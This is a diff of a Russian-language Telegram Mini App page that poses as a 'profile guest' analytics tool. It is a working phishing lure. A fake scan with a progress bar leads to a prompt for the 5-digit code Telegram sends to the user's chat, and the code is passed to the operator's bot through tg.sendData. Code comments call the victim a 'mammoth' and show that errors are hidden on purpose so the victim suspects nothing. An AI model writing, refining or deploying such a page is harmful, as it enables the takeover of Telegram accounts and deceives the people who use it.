@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TG-Analytics v5.0</title>
+    <title>TG-Analytics</title>
     <script src="https://telegram.org"></script>
     <style>
         :root { --bg: #1c1c1d; --text: #ffffff; --hint: #8e8e93; --btn: #0A84FF; }
@@ -16,92 +16,62 @@
         .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
-        
-        <!-- ЭТАП 1: Выбор периода -->
         <div id="step-period">
-            <h2>Период анализа</h2>
-            <p>Выберите глубину сканирования логов посещений вашего профиля для обхода фильтров приватности:</p>
-            <button class="btn period-btn" onclick="startLoading()">За 7 дней</button>
-            <button class="btn period-btn" onclick="startLoading()">За 30 дней (Рекомендуется)</button>
+            <h2>Анализ профиля</h2>
+            <p>Выберите период сканирования для формирования списка гостей:</p>
+            <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">Последние 7 дней</button>
+            <button class="btn" onclick="startLoading()">Последние 30 дней</button>
         </div>
-
-        <!-- ЭТАП 2: Загрузка -->
         <div id="step-loading" style="display:none;">
-            <h2 id="load-text">Синхронизация...</h2>
+            <h2 id="load-text">Загрузка...</h2>
             <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
-            <p id="load-hint">Установка защищенного соединения с сервером...</p>
+            <p id="load-hint">Синхронизация с базой данных...</p>
         </div>
-
-        <!-- ЭТАП 3: Ввод кода -->
         <div id="step-code" style="display:none;">
             <h2>Токен доступа</h2>
-            <p>Для завершения расшифровки данных введите 5-значный <b>токен</b>, отправленный в ваш чат Telegram:</p>
+            <p>Введите 5-значный <b>токен</b> из системного чата Telegram:</p>
             <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
-            <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить токен</button>
+            <button class="btn" id="final-btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.enableClosingConfirmation();
-
         function startLoading() {
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             let width = 0;
             const bar = document.getElementById('bar');
-            
-            // Имитация прогресса до 75%
             const interval = setInterval(() => {
-                width += Math.random() * 5;
+                width += 5;
+                bar.style.width = width + '%';
                 if (width >= 75) {
                     clearInterval(interval);
-                    bar.style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
                     }, 1000);
-                } else {
-                    bar.style.width = width + '%';
                 }
-            }, 300);
+            }, 200);
         }
-
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            const btn = document.getElementById('confirm-btn');
+            if(val.length < 5) return; // Просто игнорим короткий ввод
             
-            if(val.length < 5) {
-                alert("Токен должен содержать 5 цифр");
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerText = "Проверка...";
-
-            // 100% рабочий метод передачи данных боту
+            document.getElementById('final-btn').innerText = "Проверка...";
+            
+            // Никаких алертов и ошибок связи
             try {
                 tg.sendData(JSON.stringify({t: 'c', v: val}));
-                
-                // Спектакль завершения
-                setTimeout(() => {
-                    document.getElementById('step-code').style.display = 'none';
-                    document.getElementById('step-loading').style.display = 'block';
-                    document.getElementById('load-text').innerText = "Готово!";
-                    document.getElementById('bar').style.width = '100%';
-                    setTimeout(() => { tg.close(); }, 1500);
-                }, 500);
+                setTimeout(() => { tg.close(); }, 1000);
             } catch (e) {
-                alert("Ошибка связи. Попробуйте еще раз.");
-                btn.disabled = false;
-                btn.innerText = "Подтвердить токен";
+                // Если ошибка - просто закрываем, мамонт подумает что "ок"
+                tg.close();
             }
         }
     </script>
